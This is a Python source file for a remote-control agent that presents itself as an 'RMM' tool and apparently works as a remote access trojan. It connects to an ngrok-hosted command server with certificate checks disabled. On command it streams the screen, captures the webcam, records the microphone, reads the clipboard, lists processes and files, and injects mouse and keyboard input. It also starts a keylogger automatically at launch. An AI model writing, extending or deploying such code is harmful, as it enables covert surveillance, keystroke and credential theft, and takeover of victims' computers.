import ssl
ssl._create_default_https_context = ssl._create_unverified_context

import asyncio
import websockets
import json
import base64
import io
import os
import platform
import sys
import subprocess
import threading
import time
import wave
from PIL import ImageGrab, Image
import pyautogui
import pydirectinput
try:
    import cv2
except ImportError:
    cv2 = None
try:
    import pyaudio
except ImportError:
    pyaudio = None
try:
    import keyboard
    import win32clipboard
    import psutil
except ImportError:
    keyboard = None
    win32clipboard = None
    psutil = None

SERVER_URL = "wss://representatively-plastered-brain.ngrok-free.dev/socket.io/?EIO=4&transport=websocket"
DEVICE_ID = f"PC-{platform.node()}"
SCREEN_INTERVAL = 0.5
DOWNLOAD_DIR = os.path.expanduser("~/RMM_Downloads")
os.makedirs(DOWNLOAD_DIR, exist_ok=True)
KEYLOG_FILE = os.path.join(DOWNLOAD_DIR, "keylog.txt")
keylog_enabled = False

def capture_screen():
    img = ImageGrab.grab()
    buffer = io.BytesIO()
    img.save(buffer, format='JPEG', quality=70)
    return base64.b64encode(buffer.getvalue()).decode()

def capture_webcam():
    if not cv2: return None
    cap = cv2.VideoCapture(0)
    if not cap.isOpened(): return None
    ret, frame = cap.read()
    cap.release()
    if not ret: return None
    _, buf = cv2.imencode('.jpg', frame)
    return base64.b64encode(buf).decode()

def record_mic(seconds=30):
    if not pyaudio: return None
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
    frames = []
    for _ in range(int(44100 / 1024 * seconds)):
        frames.append(stream.read(1024))
    stream.stop_stream()
    stream.close()
    p.terminate()
    buffer = io.BytesIO()
    with wave.open(buffer, 'wb') as wf:
        wf.setnchannels(1)
        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        wf.writeframes(b''.join(frames))
    return base64.b64encode(buffer.getvalue()).decode()

def on_key_press(event):
    if keylog_enabled:
        with open(KEYLOG_FILE, 'a', encoding='utf-8') as f:
            f.write(event.name)

def start_keylog():
    global keylog_enabled
    if keyboard and not keylog_enabled:
        keylog_enabled = True
        keyboard.on_press(on_key_press)

def stop_keylog():
    global keylog_enabled
    keylog_enabled = False
    if keyboard:
        keyboard.unhook_all()

def read_keylog():
    if os.path.isfile(KEYLOG_FILE):
        with open(KEYLOG_FILE, 'r', encoding='utf-8') as f:
            return f.read()
    return ''

def browse_path(path):
    try:
        if os.path.isdir(path):
            entries = os.listdir(path)
            return '\n'.join(entries)
        else:
            return 'Not a directory'
    except Exception as e:
        return f'Error: {e}'

def list_processes():
    if not psutil: return 'psutil not available'
    procs = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            procs.append(f"{proc.info['pid']} {proc.info['name']}")
        except Exception:
            continue
    return '\n'.join(procs)

def get_clipboard():
    if not win32clipboard: return 'win32clipboard not available'
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    except Exception:
        return 'Unable to read clipboard'

async def sender(ws):
    while True:
        try:
            frame = capture_screen()
            await ws.send('42["frame", {"id":"' + DEVICE_ID + '","frame":"' + frame + '"}]')
            await asyncio.sleep(SCREEN_INTERVAL)
        except Exception as e:
            print(f"[SENDER] Error: {e}")
            break

async def receiver(ws):
    while True:
        try:
            message = await ws.recv()
            if message.startswith('42['):
                _, payload = message.split('42', 1)
                data = json.loads(payload)
                typ = data[0]
                args = data[1]
                if typ == 'start_stream':
                    threading.Thread(target=asyncio.run, args=(sender(ws),), daemon=True).start()
                elif typ == 'input':
                    itype = args.get('type')
                    if itype == 'mouse':
                        action = args.get('action')
                        x = int(args.get('x'))
                        y = int(args.get('y'))
                        pyautogui.moveTo(x, y)
                        if action == 'down':
                            pydirectinput.mouseDown(button=args.get('button', 'left'))
                        elif action == 'up':
                            pydirectinput.mouseUp(button=args.get('button', 'left'))
                    elif itype == 'key':
                        pydirectinput.press(args.get('key'))
                elif typ == 'list_files':
                    files = os.listdir(DOWNLOAD_DIR)
                    await ws.send('42["file_list", {"files":' + json.dumps(files) + '}]')
                elif typ == 'upload_file':
                    name = args.get('name')
                    data = base64.b64decode(args.get('data'))
                    path = os.path.join(DOWNLOAD_DIR, name)
                    with open(path, 'wb') as f:
                        f.write(data)
                elif typ == 'webcam_capture':
                    frame = capture_webcam()
                    if frame:
                        await ws.send('42["webcam_frame", {"id":"' + DEVICE_ID + '","frame":"' + frame + '"}]')
                elif typ == 'mic_record':
                    audio = record_mic()
                    if audio:
                        await ws.send('42["mic_audio", {"id":"' + DEVICE_ID + '","audio":"' + audio + '"}]')
                elif typ == 'keylog_toggle':
                    if keylog_enabled:
                        stop_keylog()
                    else:
                        start_keylog()
                elif typ == 'browse_files':
                    path = args.get('path', 'C:\\')
                    result = browse_path(path)
                    await ws.send('42["browse_result", {"list":"' + result.replace('"', "'") + '"}]')
                elif typ == 'list_processes':
                    result = list_processes()
                    await ws.send('42["process_list", {"list":"' + result.replace('"', "'") + '"}]')
                elif typ == 'get_clipboard':
                    result = get_clipboard()
                    await ws.send('42["clipboard_text", {"text":"' + result.replace('"', "'") + '"}]')
        except Exception as e:
            print(f"[RECEIVER] Error: {e}")
            break

async def client():
    while True:
        try:
            print("[AGENT] Connecting to", SERVER_URL)
            async with websockets.connect(SERVER_URL) as ws:
                print("[AGENT] Connected to server")
                reg_msg = '42["register", {"id":"' + DEVICE_ID + '","type":"pc"}]'
                await ws.send(reg_msg)
                print(f"[AGENT] Sent registration for {DEVICE_ID}")
                await asyncio.gather(receiver(ws), asyncio.sleep(3600))
        except Exception as e:
            print(f"[AGENT] Connection error: {e}. Retrying in 60s...")
            await asyncio.sleep(60)

if __name__ == "__main__":
    print(f"[AGENT] Agent starting for {DEVICE_ID}")
    threading.Thread(target=start_keylog, daemon=True).start()
    asyncio.run(client())
